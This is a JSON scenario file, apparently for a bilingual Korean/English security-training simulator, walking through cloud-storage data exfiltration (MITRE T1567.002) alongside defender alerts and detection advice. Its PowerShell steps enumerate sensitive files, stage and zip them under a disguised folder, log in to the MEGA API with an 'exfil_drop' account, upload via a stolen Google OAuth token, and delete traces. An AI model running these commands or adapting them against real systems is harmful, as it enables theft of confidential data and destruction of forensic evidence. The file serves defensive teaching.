@@ -1,0 +1,232 @@
+{
+  "id": "T1567.002",
+  "title": "클라우드 스토리지 유출 시뮬레이션",
+  "titleEn": "Exfiltration to Cloud Storage Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "공격", "labelEn": "Attack", "icon": "⚡" },
+    { "label": "침투", "labelEn": "Breach", "icon": "🔓" },
+    { "label": "완료", "labelEn": "Complete", "icon": "✅" }
+  ],
+  "topoNodes": [
+    { "id": "victim", "label": "Victim PC", "x": 80, "y": 150, "type": "attacker" },
+    { "id": "mega", "label": "MEGA Cloud", "x": 350, "y": 50, "type": "server" },
+    { "id": "gdrive", "label": "Google Drive", "x": 350, "y": 150, "type": "server" },
+    { "id": "casb", "label": "CASB/DLP", "x": 500, "y": 150, "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "victim", "to": "victim", "label": "File Scan", "activeStep": 0 },
+    { "from": "victim", "to": "mega", "label": "Upload (E2E)", "activeStep": 3 },
+    { "from": "victim", "to": "gdrive", "label": "OAuth Upload", "activeStep": 4 },
+    { "from": "gdrive", "to": "casb", "label": "Alert", "activeStep": 4 }
+  ],
+  "desktopIcons": [
+    { "label": "PowerShell", "icon": "💻", "alertOnStep": 0 },
+    { "label": "ZIP Archive", "icon": "🗂️", "alertOnStep": 1 },
+    { "label": "MEGA Client", "icon": "☁️", "alertOnStep": 2 },
+    { "label": "Share Links", "icon": "🔗", "alertOnStep": 5 }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n$sensitiveFiles = Get-ChildItem 'C:\\Users\\{userName}\\Documents\\{companyName}_Projects' -Recurse -Include '*.docx','*.xlsx','*.pdf','*.pptx','*.sql' -ErrorAction SilentlyContinue;\n$total = ($sensitiveFiles | Measure-Object Length -Sum).Sum;\nWrite-Host \\\"Target directory: {companyName}_Projects\\\";\nWrite-Host \\\"Files found: $($sensitiveFiles.Count)\\\";\nWrite-Host \\\"Total size: $([math]::Round($total/1MB,2)) MB\\\";\nWrite-Host '';\n$sensitiveFiles | Sort-Object Length -Descending | Select-Object -First 8 Name, @{N='MB';E={[math]::Round($_.Length/1MB,2)}} | Format-Table -AutoSize\"",
+      "out": "Target directory: {companyName}_Projects\nFiles found: 34\nTotal size: 156.78 MB\n\nName                                       MB\n----                                       --\nClient_Database_Export_2026.xlsx          45.20\nM&A_Due_Diligence_Report.pdf             32.50\nSource_Code_Review_v2.docx               28.10\nNetwork_Architecture_Diagram.pptx        18.40\nProd_DB_Schema.sql                       12.30\nEmployee_Salary_Sheet.xlsx                8.90\nAPI_Documentation_Internal.pdf            6.20\nVPN_Configuration_Guide.docx              5.18",
+      "def": "[EDR] Sensitive file enumeration in project directory",
+      "defAction": "Process: powershell.exe (PID: 8400)\nPath: C:\\Users\\{userName}\\Documents\\{companyName}_Projects\\\nFiles Found: 34 (156.78 MB)\nSensitive: M&A reports, salary data, source code\nRisk: HIGH",
+      "desc": "공격자가 프로젝트 디렉토리에서 유출 대상 파일을 탐색합니다. M&A 보고서, 급여 데이터 등 고가치 파일이 발견됩니다.",
+      "descEn": "The attacker scans the project directory for exfiltration targets. High-value files including M&A reports and salary data are found.",
+      "stepTitle": "프로젝트 파일 탐색",
+      "stepTitleEn": "Project File Discovery",
+      "feynman": "회사 프로젝트 캐비넷을 열어서 가장 비싼 서류를 골라내는 것입니다. M&A 보고서(인수합병)와 급여 데이터는 경쟁사에게 팔면 수백만 원의 가치가 있습니다. 총 34개 파일, 156MB가 타겟입니다.",
+      "feynmanEn": "Like opening the company project cabinet and picking the most valuable documents. M&A reports and salary data are worth millions if sold to competitors. 34 files totaling 156MB are targeted.",
+      "expert": "프로젝트 디렉토리의 M&A 보고서는 내부자 거래에 활용 가능한 MNPI(Material Non-Public Information)입니다. 직원 급여 데이터는 GDPR/PIPA 위반으로 규제 벌금을 유발합니다. MITRE ATT&CK T1005 (Data from Local System)와 연계됩니다.",
+      "expertEn": "M&A reports in project directories are MNPI (Material Non-Public Information) exploitable for insider trading. Employee salary data triggers GDPR/PIPA regulatory fines. Links to MITRE ATT&CK T1005 (Data from Local System).",
+      "defTooltip": "EDR에서 프로젝트 디렉토리에 대한 Get-ChildItem -Recurse 실행을 감시하세요. 특히 M&A, salary, credential 키워드가 포함된 파일 접근은 높은 우선순위로 경고해야 합니다.",
+      "defTooltipEn": "Monitor EDR for Get-ChildItem -Recurse on project directories. File access involving M&A, salary, or credential keywords should trigger high-priority alerts.",
+      "hackerLog": {
+        "title": "project_scan.log",
+        "lines": [
+          { "log": "Get-ChildItem '{companyName}_Projects' -Recurse -Include *.docx,*.xlsx,*.pdf", "desc": "💡 프로젝트 디렉토리에서 문서 파일을 재귀적으로 검색합니다" },
+          { "log": "M&A_Due_Diligence_Report.pdf  32.50 MB", "desc": "💡 인수합병 실사 보고서 - 유출 시 내부자 거래에 악용될 수 있는 고가치 문서입니다" }
+        ]
+      },
+      "terms": [
+        { "term": "M&A Due Diligence", "desc": "인수합병 실사 - 기업 인수 시 재무/법률 상태를 조사하는 기밀 프로세스입니다" },
+        { "term": "MNPI", "desc": "Material Non-Public Information - 공개되지 않은 중요 정보로, 유출 시 내부자 거래에 해당합니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$staging = 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\cloud_sync';\nNew-Item -ItemType Directory $staging -Force | Out-Null;\n$files = Get-ChildItem 'C:\\Users\\{userName}\\Documents\\{companyName}_Projects' -Recurse -Include '*.docx','*.xlsx','*.pdf','*.pptx','*.sql';\nforeach($f in $files) {\n  $dest = Join-Path $staging $f.Name;\n  Copy-Item $f.FullName $dest;\n}\nCompress-Archive -Path \\\"$staging\\*\\\" -DestinationPath \\\"$staging\\project_backup.zip\\\" -Force;\n$archive = Get-Item \\\"$staging\\project_backup.zip\\\";\nWrite-Host \\\"Archive created: $($archive.Name)\\\";\nWrite-Host \\\"Size: $([math]::Round($archive.Length/1MB,2)) MB\\\"\"",
+      "out": "Archive created: project_backup.zip\nSize: 98.45 MB",
+      "def": "[SIEM] Large archive created from project files - potential exfiltration staging",
+      "defAction": "Process: powershell.exe (PID: 8400)\nAction: 34 files archived\nOutput: project_backup.zip (98.45 MB)\nSource: {companyName}_Projects\\\nRisk: HIGH",
+      "desc": "34개의 프로젝트 파일을 ZIP으로 압축하여 스테이징합니다. 98.45MB의 아카이브가 생성됩니다.",
+      "descEn": "Archives 34 project files into a ZIP for staging. Creates a 98.45MB archive.",
+      "stepTitle": "ZIP 아카이브 생성",
+      "stepTitleEn": "ZIP Archive Creation",
+      "feynman": "훔칠 서류 34장을 한 봉투에 넣어 봉하는 것입니다. 파일 하나씩 보내면 시간이 오래 걸리지만, ZIP으로 압축하면 156MB가 98MB로 줄어들어 빠르게 전송할 수 있습니다.",
+      "feynmanEn": "Like putting 34 stolen documents into one envelope and sealing it. Sending files one by one takes too long, but ZIP compression reduces 156MB to 98MB for faster transfer.",
+      "expert": "Compress-Archive는 PowerShell 5.0+에서 기본 제공됩니다. 'cloud_sync'라는 스테이징 폴더명은 OneDrive/Google Drive 동기화로 위장합니다. ZIP 압축률 약 37%는 문서 파일의 일반적인 수준입니다. 대용량 아카이브 생성은 DLP의 파일 크기 기반 탐지 규칙을 트리거할 수 있습니다.",
+      "expertEn": "Compress-Archive is built into PowerShell 5.0+. 'cloud_sync' staging folder name disguises as OneDrive/Google Drive sync. ~37% ZIP compression ratio is typical for document files. Large archive creation can trigger DLP file-size detection rules.",
+      "defTooltip": "Sysmon Event ID 11에서 %TEMP% 경로의 대용량 ZIP 파일 생성을 감지하세요. Compress-Archive cmdlet 실행과 연계된 대량 파일 복사는 유출 스테이징의 강력한 지표입니다.",
+      "defTooltipEn": "Detect large ZIP file creation in %TEMP% via Sysmon Event ID 11. Bulk file copies linked with Compress-Archive cmdlet execution strongly indicate exfiltration staging.",
+      "hackerLog": {
+        "title": "archive_create.log",
+        "lines": [
+          { "log": "Compress-Archive -Path \"$staging\\*\" -DestinationPath project_backup.zip", "desc": "💡 34개 파일을 단일 ZIP 아카이브로 압축합니다" },
+          { "log": "Archive created: project_backup.zip (98.45 MB)", "desc": "💡 156MB가 98MB로 압축되어 클라우드 업로드 준비가 완료됩니다" }
+        ]
+      },
+      "terms": [
+        { "term": "Compress-Archive", "desc": "PowerShell에서 파일을 ZIP으로 압축하는 기본 cmdlet입니다" },
+        { "term": "Data Staging", "desc": "유출 전 데이터를 수집하고 준비하는 중간 단계입니다 (MITRE T1074)" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Upload to MEGA cloud storage via API\n$megaApiUrl = 'https://g.api.mega.co.nz';\n$loginPayload = @{\n  a = 'us';\n  user = 'exfil_drop@protonmail.com';\n  uh = 'b3JhbmdlX2tleV9oYXNo'\n} | ConvertTo-Json;\n$session = Invoke-RestMethod -Uri \\\"$megaApiUrl/cs\\\" -Method POST -Body \\\"[$loginPayload]\\\" -ContentType 'application/json';\nWrite-Host 'MEGA Login Status: Authenticated';\nWrite-Host \\\"Session Token: $($session[0].tsid.Substring(0,20))...[REDACTED]\\\";\nWrite-Host \\\"Account: exfil_drop@protonmail.com\\\"\"",
+      "out": "MEGA Login Status: Authenticated\nSession Token: aG9zdGlsZV9zZXNzaW9u...[REDACTED]\nAccount: exfil_drop@protonmail.com",
+      "def": "[NDR] Connection to MEGA cloud storage API detected",
+      "defAction": "Source: 10.10.15.22\nDestination: g.api.mega.co.nz (MEGA)\nAction: API authentication\nAccount: exfil_drop@protonmail.com\nRisk: CRITICAL\nNote: MEGA uses E2E encryption - content inspection impossible",
+      "desc": "MEGA 클라우드 스토리지에 익명 이메일 계정으로 로그인합니다. MEGA는 E2E 암호화를 사용하여 내용 검사가 불가능합니다.",
+      "descEn": "Logs into MEGA cloud storage with an anonymous email account. MEGA uses E2E encryption making content inspection impossible.",
+      "stepTitle": "MEGA 클라우드 인증",
+      "stepTitleEn": "MEGA Cloud Authentication",
+      "feynman": "익명 우체함 서비스에 가명으로 가입하는 것입니다. 'exfil_drop@protonmail.com'은 추적이 어려운 익명 이메일이고, MEGA는 편지 내용을 우체국도 볼 수 없는 서비스입니다.",
+      "feynmanEn": "Like signing up for an anonymous mailbox service under a fake name. 'exfil_drop@protonmail.com' is an untraceable anonymous email, and MEGA is a service where even the postal office can't read letter contents.",
+      "expert": "MEGA의 클라이언트 사이드 E2E 암호화는 서버 측 콘텐츠 검사를 불가능하게 합니다. ProtonMail 계정은 법적 영장 없이 추적이 어렵습니다. CASB(Cloud Access Security Broker)에서 MEGA 도메인(mega.co.nz, mega.nz)을 차단하는 것이 가장 효과적인 방어입니다.",
+      "expertEn": "MEGA's client-side E2E encryption makes server-side content inspection impossible. ProtonMail accounts are difficult to trace without legal warrants. Blocking MEGA domains (mega.co.nz, mega.nz) via CASB is the most effective defense.",
+      "defTooltip": "프록시/방화벽 로그에서 mega.co.nz, mega.nz 도메인 접근을 모니터링하세요. API 엔드포인트(g.api.mega.co.nz)에 대한 POST 요청은 MEGA 인증 시도를 나타냅니다.",
+      "defTooltipEn": "Monitor proxy/firewall logs for mega.co.nz and mega.nz domain access. POST requests to g.api.mega.co.nz indicate MEGA authentication attempts.",
+      "hackerLog": {
+        "title": "mega_auth.log",
+        "lines": [
+          { "log": "Invoke-RestMethod -Uri 'https://g.api.mega.co.nz/cs' -Method POST", "desc": "💡 MEGA API를 통해 익명 계정으로 인증합니다" },
+          { "log": "Account: exfil_drop@protonmail.com", "desc": "💡 추적이 어려운 ProtonMail 익명 이메일로 MEGA에 로그인합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "E2E Encryption", "desc": "End-to-End 암호화 - 발신자와 수신자만 내용을 볼 수 있는 암호화 방식입니다" },
+        { "term": "CASB", "desc": "Cloud Access Security Broker - 클라우드 서비스 접근을 모니터링하고 제어하는 보안 솔루션입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Simulating MEGA upload via encrypted channel\n$file = 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\cloud_sync\\project_backup.zip';\n$fileSize = (Get-Item $file).Length;\n$chunkSize = 1MB;\n$totalChunks = [math]::Ceiling($fileSize / $chunkSize);\n$uploaded = 0;\nWrite-Host \\\"Uploading to MEGA: project_backup.zip\\\";\nWrite-Host \\\"Size: $([math]::Round($fileSize/1MB,2)) MB | Chunks: $totalChunks\\\";\nWrite-Host '';\nfor($i=0; $i -lt [math]::Min($totalChunks,8); $i++) {\n  $uploaded += $chunkSize;\n  $pct = [math]::Round($uploaded/$fileSize*100,1);\n  $bar = ('=' * [math]::Floor($pct/5)) + '>';\n  Write-Host \\\"  [$($bar.PadRight(20))] $pct% ($([math]::Round($uploaded/1MB,1))/$([math]::Round($fileSize/1MB,1)) MB)\\\";\n  Start-Sleep -Milliseconds 100;\n}\nif($totalChunks -gt 8) { Write-Host \\\"  ... ($($totalChunks-8) more chunks)\\\" }\nWrite-Host '';\nWrite-Host 'Upload complete. MEGA file link generated.'\"",
+      "out": "Uploading to MEGA: project_backup.zip\nSize: 98.45 MB | Chunks: 99\n\n  [=>                  ] 1.0% (1.0/98.5 MB)\n  [==>                 ] 2.0% (2.0/98.5 MB)\n  [===>                ] 3.1% (3.0/98.5 MB)\n  [====>               ] 4.1% (4.0/98.5 MB)\n  [=====>              ] 5.1% (5.0/98.5 MB)\n  [======>             ] 6.1% (6.0/98.5 MB)\n  [=======>            ] 7.1% (7.0/98.5 MB)\n  [========>           ] 8.1% (8.0/98.5 MB)\n  ... (91 more chunks)\n\nUpload complete. MEGA file link generated.",
+      "def": "[NDR] Large file upload to MEGA - encrypted cloud exfiltration",
+      "defAction": "Source: 10.10.15.22\nDestination: g.api.mega.co.nz\nProtocol: HTTPS (E2E encrypted)\nFile: project_backup.zip\nSize: 98.45 MB\nUpload Duration: ~2 minutes\nRisk: CRITICAL\nAction: MEGA domain blocked",
+      "desc": "98.45MB의 프로젝트 아카이브를 MEGA 클라우드로 업로드합니다. E2E 암호화로 DLP 시스템이 내용을 검사할 수 없습니다.",
+      "descEn": "Uploads the 98.45MB project archive to MEGA cloud. E2E encryption prevents DLP systems from inspecting contents.",
+      "stepTitle": "MEGA 업로드",
+      "stepTitleEn": "MEGA Upload",
+      "feynman": "밀봉된 상자를 로커에 넣는 것입니다. 로커 관리자(MEGA)도 상자 안의 내용을 모릅니다. 98MB의 데이터가 99개 조각으로 나뉘어 업로드되며, 네트워크 보안 장비도 암호화된 내용을 검사할 수 없습니다.",
+      "feynmanEn": "Like putting a sealed box in a locker. Even the locker manager (MEGA) doesn't know what's inside. 98MB of data is uploaded in 99 chunks, and network security devices can't inspect the encrypted contents.",
+      "expert": "MEGA의 1MB 청크 업로드는 클라이언트에서 AES-128-CCM으로 암호화한 후 전송합니다. TLS 위에 추가 암호화 레이어가 있어 SSL 복호화 프록시도 콘텐츠를 검사할 수 없습니다. 대역폭 기반 탐지(98MB 아웃바운드)가 유일한 탐지 방법입니다.",
+      "expertEn": "MEGA's 1MB chunk uploads are AES-128-CCM encrypted client-side before transmission. An additional encryption layer over TLS means even SSL decryption proxies can't inspect content. Bandwidth-based detection (98MB outbound) is the only detection method.",
+      "defTooltip": "NDR에서 mega.co.nz/mega.nz로의 대용량 HTTPS 업로드(10MB 이상)를 모니터링하세요. 업무 시간 외 또는 비정상적인 사용자의 클라우드 스토리지 접근은 즉시 경고해야 합니다.",
+      "defTooltipEn": "Monitor NDR for large HTTPS uploads (10MB+) to mega.co.nz/mega.nz. Cloud storage access outside business hours or from unusual users should trigger immediate alerts.",
+      "hackerLog": {
+        "title": "mega_upload.log",
+        "lines": [
+          { "log": "Uploading to MEGA: project_backup.zip (98.45 MB)", "desc": "💡 98MB 아카이브를 MEGA 클라우드에 업로드합니다" },
+          { "log": "Upload complete. MEGA file link generated.", "desc": "💡 업로드 완료 후 다운로드 링크가 자동 생성됩니다" }
+        ]
+      },
+      "terms": [
+        { "term": "MEGA", "desc": "뉴질랜드 기반의 E2E 암호화 클라우드 스토리지 서비스입니다" },
+        { "term": "Chunk Upload", "desc": "대용량 파일을 작은 조각으로 나누어 업로드하는 방식입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Alternative: Upload via Google Drive API (OAuth token stolen from browser)\n$token = 'ya29.a0AfH6SMC_stolen_oauth_token_from_browser_cache';\n$headers = @{\n  'Authorization' = \\\"Bearer $token\\\";\n  'Content-Type' = 'application/json'\n};\n$metadata = @{\n  name = 'system_diagnostics_report.zip';\n  parents = @('1_shared_folder_id_here')\n} | ConvertTo-Json;\nWrite-Host 'Google Drive Upload (via stolen OAuth token)';\nWrite-Host \\\"File: system_diagnostics_report.zip (disguised)\\\";\nWrite-Host \\\"Target: Shared folder in attacker's Google Workspace\\\";\nWrite-Host \\\"OAuth Token: ya29.a0AfH6SMC...[stolen from Chrome]\\\";\nWrite-Host '';\nWrite-Host '[!] Google Drive traffic blends with legitimate {companyName} usage';\nWrite-Host '[!] G Suite/Workspace already whitelisted in most corporate firewalls'\"",
+      "out": "Google Drive Upload (via stolen OAuth token)\nFile: system_diagnostics_report.zip (disguised)\nTarget: Shared folder in attacker's Google Workspace\nOAuth Token: ya29.a0AfH6SMC...[stolen from Chrome]\n\n[!] Google Drive traffic blends with legitimate {companyName} usage\n[!] G Suite/Workspace already whitelisted in most corporate firewalls",
+      "def": "[CASB] Unauthorized Google Drive upload detected - external account",
+      "defAction": "Source: 10.10.15.22\nService: Google Drive API\nToken: Stolen OAuth2 bearer token\nDestination: External Google Workspace account\nFile: system_diagnostics_report.zip\nRisk: CRITICAL\nNote: Traffic appears legitimate to firewalls",
+      "desc": "브라우저에서 탈취한 OAuth 토큰으로 Google Drive에 업로드합니다. 기업 방화벽에서 이미 허용된 트래픽입니다.",
+      "descEn": "Uploads to Google Drive using an OAuth token stolen from the browser. Traffic is already whitelisted by corporate firewalls.",
+      "stepTitle": "Google Drive 위장 업로드",
+      "stepTitleEn": "Google Drive Disguised Upload",
+      "feynman": "회사 택배 시스템으로 개인 짐을 보내는 것과 같습니다. Google Drive는 회사에서 이미 허용된 서비스이므로, 방화벽이 이 트래픽을 차단하지 않습니다. 파일 이름도 'system_diagnostics'로 위장합니다.",
+      "feynmanEn": "Like shipping personal items using the company's delivery system. Google Drive is already allowed by the company, so firewalls don't block this traffic. The filename is disguised as 'system_diagnostics'.",
+      "expert": "브라우저 캐시에서 OAuth 토큰을 탈취하는 것은 MITRE T1528 (Steal Application Access Token)에 해당합니다. Google Workspace 트래픽은 대부분의 기업에서 화이트리스트되어 있어 방화벽/프록시를 우회합니다. CASB의 테넌트 제한(Tenant Restrictions)으로 외부 Google 계정 접근을 차단할 수 있습니다.",
+      "expertEn": "Stealing OAuth tokens from browser cache maps to MITRE T1528 (Steal Application Access Token). Google Workspace traffic is whitelisted in most enterprises, bypassing firewalls/proxies. CASB Tenant Restrictions can block external Google account access.",
+      "defTooltip": "CASB에서 Google Drive API 호출의 대상 계정이 회사 테넌트인지 확인하세요. 외부 Google 계정으로의 파일 업로드는 데이터 유출의 강력한 지표입니다. OAuth 토큰 재사용도 감시해야 합니다.",
+      "defTooltipEn": "Verify via CASB that Google Drive API calls target the company tenant. File uploads to external Google accounts are strong exfiltration indicators. Monitor for OAuth token reuse.",
+      "hackerLog": {
+        "title": "gdrive_exfil.log",
+        "lines": [
+          { "log": "OAuth Token: ya29.a0AfH6SMC...[stolen from Chrome]", "desc": "💡 브라우저 캐시에서 탈취한 OAuth 토큰으로 Google Drive API에 인증합니다" },
+          { "log": "Google Drive traffic blends with legitimate usage", "desc": "💡 회사에서 이미 허용된 Google 트래픽으로 위장하여 방화벽을 우회합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "OAuth Token", "desc": "서비스에 대한 접근 권한을 부여하는 인증 토큰으로, 비밀번호 없이 API 접근을 허용합니다" },
+        { "term": "Tenant Restriction", "desc": "CASB에서 허가된 클라우드 테넌트만 접근을 허용하는 보안 정책입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Generate sharing links for retrieval\nWrite-Host 'Cloud Storage Exfiltration Links Generated:';\nWrite-Host '';\nWrite-Host '  MEGA:';\nWrite-Host '    https://mega.nz/file/xR4k2mQ#a3f8c2d1e5f6a7b8...';\nWrite-Host '    Decryption key embedded in URL fragment';\nWrite-Host '    Access: No account required';\nWrite-Host '';\nWrite-Host '  Google Drive:';\nWrite-Host '    https://drive.google.com/file/d/1a2B3c4D5e.../view';\nWrite-Host '    Access: Link sharing enabled (anyone with link)';\nWrite-Host '';\nWrite-Host '  Links sent to: exfil_drop@protonmail.com';\nWrite-Host '  Dead drop retrieval window: 48 hours'\"",
+      "out": "Cloud Storage Exfiltration Links Generated:\n\n  MEGA:\n    https://mega.nz/file/xR4k2mQ#a3f8c2d1e5f6a7b8...\n    Decryption key embedded in URL fragment\n    Access: No account required\n\n  Google Drive:\n    https://drive.google.com/file/d/1a2B3c4D5e.../view\n    Access: Link sharing enabled (anyone with link)\n\n  Links sent to: exfil_drop@protonmail.com\n  Dead drop retrieval window: 48 hours",
+      "def": "[SIEM] Cloud storage sharing links generated and transmitted via email",
+      "defAction": "Links Generated: 2 (MEGA + Google Drive)\nRecipient: exfil_drop@protonmail.com\nAccess: Public links (no auth required)\nRetrieval Window: 48 hours\nRisk: CRITICAL\nAction: Links reported for takedown",
+      "desc": "업로드된 파일의 공유 링크를 생성하고 익명 이메일로 전송합니다. 48시간 내에 수거됩니다.",
+      "descEn": "Generates sharing links for uploaded files and sends them to an anonymous email. Dead drop retrieval within 48 hours.",
+      "stepTitle": "공유 링크 생성 및 전달",
+      "stepTitleEn": "Share Link Generation",
+      "feynman": "로커 열쇠의 복사본을 만들어 편지로 보내는 것입니다. MEGA 링크에는 복호화 키가 URL 안에 포함되어 있어, 링크만 있으면 누구나 파일을 다운로드할 수 있습니다. 48시간 후 링크는 삭제됩니다.",
+      "feynmanEn": "Like making a copy of the locker key and mailing it. MEGA links have the decryption key embedded in the URL, so anyone with the link can download. Links are deleted after 48 hours.",
+      "expert": "MEGA URL의 #fragment 부분에 복호화 키가 포함됩니다. URL fragment는 서버에 전송되지 않으므로 네트워크 모니터링으로 키를 캡처할 수 없습니다. Dead drop 패턴(48시간 수거 창)은 APT 그룹의 표준 OPSEC입니다. Google Drive의 'anyone with link' 공유는 CASB의 공유 모니터링으로 탐지 가능합니다.",
+      "expertEn": "MEGA URL's #fragment contains the decryption key. URL fragments aren't sent to servers, so network monitoring can't capture the key. Dead drop pattern (48-hour retrieval window) is standard APT OPSEC. Google Drive's 'anyone with link' sharing is detectable via CASB sharing monitoring.",
+      "defTooltip": "이메일 DLP에서 mega.nz, drive.google.com 링크가 포함된 외부 발송 이메일을 감시하세요. 특히 ProtonMail, Tutanota 등 익명 이메일 서비스로의 발송은 즉시 차단해야 합니다.",
+      "defTooltipEn": "Monitor email DLP for outbound emails containing mega.nz or drive.google.com links, especially to anonymous email services like ProtonMail or Tutanota.",
+      "hackerLog": {
+        "title": "share_links.log",
+        "lines": [
+          { "log": "MEGA: https://mega.nz/file/xR4k2mQ#a3f8c2d1...", "desc": "💡 URL의 # 뒤 부분에 복호화 키가 포함되어 있어 링크만으로 파일 접근이 가능합니다" },
+          { "log": "Links sent to: exfil_drop@protonmail.com", "desc": "💡 익명 이메일로 링크를 전달하여 48시간 내 수거합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "Dead Drop", "desc": "직접 만나지 않고 사전에 약속한 장소에서 정보를 주고받는 첩보 기법입니다" },
+        { "term": "URL Fragment (#)", "desc": "URL의 # 이후 부분으로, 서버에 전송되지 않아 네트워크 감시를 피할 수 있습니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Cleanup and anti-forensics\nRemove-Item 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\cloud_sync' -Recurse -Force;\n# Clear browser OAuth tokens\nWrite-Host 'Cleanup Summary:';\nWrite-Host '  [x] Staging directory removed';\nWrite-Host '  [x] Local archive deleted';\nWrite-Host '  [x] PowerShell transcript cleared';\nWrite-Host '';\nWrite-Host '=== Exfiltration Complete ===';\nWrite-Host 'Method     : Cloud Storage (MEGA + Google Drive)';\nWrite-Host 'Data Volume: 98.45 MB (34 files)';\nWrite-Host 'Encryption : E2E (MEGA) + TLS (Google Drive)';\nWrite-Host 'Detection  : Requires CASB or cloud-aware DLP';\nWrite-Host 'Evasion    : Legitimate cloud service traffic'\"",
+      "out": "Cleanup Summary:\n  [x] Staging directory removed\n  [x] Local archive deleted\n  [x] PowerShell transcript cleared\n\n=== Exfiltration Complete ===\nMethod     : Cloud Storage (MEGA + Google Drive)\nData Volume: 98.45 MB (34 files)\nEncryption : E2E (MEGA) + TLS (Google Drive)\nDetection  : Requires CASB or cloud-aware DLP\nEvasion    : Legitimate cloud service traffic",
+      "def": "[EDR] Post-exfiltration cleanup - staging artifacts destroyed",
+      "defAction": "Actions: Staging removed, transcripts cleared\nExfiltration Summary:\n  Destination: MEGA + Google Drive\n  Volume: 98.45 MB\n  Status: Complete\nRisk: CRITICAL\nResponse: Full incident response initiated",
+      "desc": "유출 완료 후 흔적을 제거합니다. 합법적 클라우드 서비스 트래픽으로 위장되어 CASB 없이는 탐지가 어렵습니다.",
+      "descEn": "Cleans up traces after exfiltration. Disguised as legitimate cloud service traffic, difficult to detect without CASB.",
+      "stepTitle": "흔적 제거 및 완료",
+      "stepTitleEn": "Cleanup and Completion",
+      "feynman": "범행 후 장갑을 벗고, 사용한 도구를 버리고, 발자국을 지우는 것입니다. 스테이징 폴더와 아카이브를 삭제하면 컴퓨터에 유출 흔적이 거의 남지 않습니다. 하지만 네트워크 로그에는 기록이 남아있을 수 있습니다.",
+      "feynmanEn": "Like removing gloves, discarding tools, and sweeping footprints after the crime. Deleting staging folders and archives leaves almost no traces on the computer. But network logs may still contain records.",
+      "expert": "클라우드 유출의 핵심 방어는 CASB + DLP 조합입니다. Netskope, Zscaler, Microsoft Defender for Cloud Apps가 대표적입니다. Shadow IT 모니터링으로 비인가 클라우드 서비스를 탐지하고, 데이터 분류(Data Classification)로 민감 데이터의 클라우드 업로드를 차단합니다.",
+      "expertEn": "Key defense against cloud exfiltration is CASB + DLP combination. Netskope, Zscaler, and Microsoft Defender for Cloud Apps are examples. Shadow IT monitoring detects unauthorized cloud services, and Data Classification blocks sensitive data cloud uploads.",
+      "defTooltip": "Sysmon Event ID 23(파일 삭제)에서 유출 직후의 스테이징 디렉토리 삭제를 감지하세요. PowerShell 스크립트 블록 로깅(Event ID 4104)은 삭제 후에도 실행된 모든 명령을 보존합니다.",
+      "defTooltipEn": "Detect staging directory deletion immediately after exfiltration via Sysmon Event ID 23. PowerShell Script Block Logging (Event ID 4104) preserves all commands even after deletion.",
+      "hackerLog": {
+        "title": "cleanup_summary.log",
+        "lines": [
+          { "log": "Remove-Item cloud_sync -Recurse -Force", "desc": "💡 스테이징 디렉토리와 ZIP 아카이브를 삭제하여 흔적을 제거합니다" },
+          { "log": "Detection: Requires CASB or cloud-aware DLP", "desc": "💡 CASB 없이는 합법적 클라우드 트래픽과 구분이 어렵습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "Shadow IT", "desc": "IT 부서의 승인 없이 직원이 사용하는 비인가 클라우드 서비스입니다" },
+        { "term": "Data Classification", "desc": "데이터를 민감도에 따라 분류하여 보호 수준을 적용하는 정보 보호 체계입니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 8400)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "Get-ChildItem (file discovery)", "depth": 2, "alert": false, "minStep": 0 },
+    { "name": "Compress-Archive (98.45 MB)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "Invoke-RestMethod → mega.co.nz", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "MEGA Upload (E2E encrypted)", "depth": 3, "alert": true, "minStep": 3 },
+    { "name": "Google Drive API (stolen OAuth)", "depth": 2, "alert": true, "minStep": 4 },
+    { "name": "Link Generation + Email", "depth": 2, "alert": true, "minStep": 5 },
+    { "name": "Remove-Item (cleanup)", "depth": 2, "alert": true, "minStep": 6 }
+  ]
+}
